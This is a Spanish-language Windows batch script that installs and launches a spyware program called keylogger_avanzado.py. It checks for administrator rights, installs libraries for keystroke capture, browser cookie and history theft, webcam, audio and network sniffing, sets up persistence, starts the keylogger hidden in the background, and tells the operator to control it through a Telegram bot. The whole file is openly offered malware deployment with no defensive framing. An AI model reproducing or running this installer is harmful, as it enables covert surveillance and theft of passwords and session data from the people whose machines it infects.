@echo off
chcp 65001 >nul
title Instalador Keylogger
color 0A

cd /d "%~dp0"

echo ================================================
echo     📦 INSTALADOR KEYLOGGER ULTIMATE
echo ================================================
echo.

:: Verificar administrador
net session >nul 2>&1
if %errorLevel% neq 0 (
    echo [ERROR] Debes ejecutar como ADMINISTRADOR
    pause
    exit /b 1
)

:: Verificar que existe el archivo
if not exist "keylogger_avanzado.py" (
    echo [ERROR] No se encuentra keylogger_avanzado.py
    echo Asegúrate de que el archivo está en esta carpeta.
    pause
    exit /b 1
)
echo [✓] keylogger_avanzado.py encontrado

:: Verificar Python
echo [1/4] Verificando Python...
python --version >nul 2>&1
if %errorLevel% neq 0 (
    echo [✗] Python no encontrado. Instálalo desde python.org
    pause
    exit /b 1
)
echo [✓] Python OK

:: Instalar dependencias
echo [2/4] Instalando dependencias...
pip install pynput requests pywin32 psutil pillow cryptography browser-cookie3 browser-history scapy opencv-python wmi dnspython pycryptodome pyaudio
if %errorLevel% neq 0 (
    echo [⚠] Algunas dependencias fallaron, pero continuamos...
)

:: Ejecutar instalación
echo [3/4] Configurando persistencia...
python keylogger_avanzado.py --install
if %errorLevel% neq 0 (
    echo [✗] Error al ejecutar --install
    echo Revisa el error arriba.
    pause
    exit /b 1
)
echo [✓] Persistencia OK

:: Iniciar keylogger
echo [4/4] Iniciando keylogger...
start /B pythonw keylogger_avanzado.py --silent 2>nul
if %errorLevel% neq 0 (
    start /B python keylogger_avanzado.py --silent
    echo [⚠] Usando python.exe (puede mostrar ventana)
) else (
    echo [✓] Keylogger en segundo plano (pythonw)
)

echo.
echo ================================================
echo ✅ INSTALACIÓN COMPLETADA
echo ================================================
echo 📱 Envía /start a tu bot en Telegram
echo 🗑️ Para desinstalar: python keylogger_avanzado.py --uninstall
echo.
pause